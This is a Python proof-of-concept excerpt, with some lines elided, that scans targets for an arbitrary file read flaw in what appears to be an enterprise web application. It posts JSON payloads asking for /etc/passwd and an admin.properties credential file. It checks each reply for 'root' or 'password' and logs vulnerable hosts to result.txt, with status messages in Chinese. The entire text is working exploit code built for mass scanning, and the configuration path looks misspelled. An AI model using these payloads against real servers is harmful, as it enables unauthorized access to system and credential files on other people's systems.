...
def poc(target):
    ...
    data1 = 'var={"body":{"file":"file:///etc/passwd"}}'
    data2 = 'var={"body":{"file":"/WEF-INF/KmssConfig/admin.properties"}}'
    try:
        res1 = requests.post(url=url,headers=headers,verify=False,timeout=5,data=data1)
        res2 = requests.post(url=url,headers=headers,verify=False,timeout=5,data=data2)
        if res1.status_code == 200 and 'root' in res1.text:
            print("[+]该站点存在漏洞,url:"+target)
            with open ('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"->Linux\n")
        else :
            print("[-]该站点不存在漏洞,url:"+target)
        if res2.status_code == 200 and 'password' in res2.text:
            print("[+]该站点存在漏洞,url:"+target)
            with open ('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"->Windows\n")
        else :
            print("[-]该站点不存在漏洞,url:"+target)
